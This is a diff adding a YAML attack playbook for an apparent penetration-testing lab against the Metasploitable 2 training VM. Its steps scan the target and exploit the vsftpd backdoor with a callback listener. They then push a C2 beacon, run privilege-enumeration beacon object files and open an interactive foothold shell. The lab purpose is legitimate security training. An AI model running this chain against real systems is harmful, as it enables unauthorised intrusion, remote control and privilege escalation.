@@ -1,0 +1,77 @@
+name: gym_metasploitable_ms2_beacon_bofs
+version: 2
+description: 'Metasploitable 2: client beacon delivery plus a BOF sweep. The exploit scope is metasploitable2; the beacon host must run a modern Linux userland (metasploitable2 is i386, skip serve) set client_target, and the C2 must be running (python3 lazyc2.py).'
+enabled: true
+extends: gym_metasploitable_chain
+tags:
+- gym
+- metasploitable2
+- beacon
+- bof
+- blacksandbeacon
+platforms:
+- linux
+defaults:
+  exploit: vsftpd_backdoor
+  vuln: ms2_beacon_bofs
+  port: '21'
+  client: blacksandbeacon
+  client_target: ''
+  bofs_run: whoami_linux,is_sudo,suid_enum
+  bof_wait: '20'
+  beacon_client_id: ''
+steps:
+- id: scope
+  phase: recon
+  description: Bind the gym target.
+  run: assign target {target}
+- id: scan
+  phase: recon
+  description: Scan once and reuse the XML on later runs.
+  run: lazynmap {target}
+  skip_if_exists: sessions/scan_{target}.nmap.xml
+  timeout: 900
+- id: exploit
+  phase: exploit
+  description: Open the vsftpd backdoor session through the atomic exploit bridge.
+  run: python3 modules/atomic_exploit_bridge.py run --id {exploit} --rhost {target}
+    --lhost {lhost} --lport {lport} --port {port} --feed
+  timeout: 180
+  continue_on_error: false
+  sinks:
+  - world_model
+  - killchain
+  - intel_graph
+  - attack_graph
+  - c2_surfaces
+  - objectives
+  - report
+- id: deliver_beacon
+  phase: c2
+  description: Stage the lazyaddon client, push the beacon over the foothold and wait for its first check-in.
+  run: bof_deploy {client} {client_target} --wait 45
+  when: client_target
+  capture: beacon_checkin
+  capture_regex: 'checked in: (?P<beacon_client_id>[A-Za-z0-9_-]+)'
+  timeout: 240
+- id: bof_sweep
+  phase: c2
+  description: Run the BOF train over the live beacon and collect in-beacon outputs.
+  run: bof_train {beacon_client_id} --bofs {bofs_run} --wait {bof_wait}
+  when: beacon_client_id
+  timeout: 300
+- id: sync
+  phase: report
+  description: Mirror the loop graphs into world model and objectives.
+  run: lazy_sync
+  continue_on_error: true
+- id: session
+  phase: report
+  description: Refresh the C2 session report.
+  run: create_session_json
+  continue_on_error: true
+- id: shell
+  phase: post
+  description: Drop into the persistent foothold shell through the atomic bridge.
+  run: atomic_shell --interactive {target}
+  continue_on_error: true
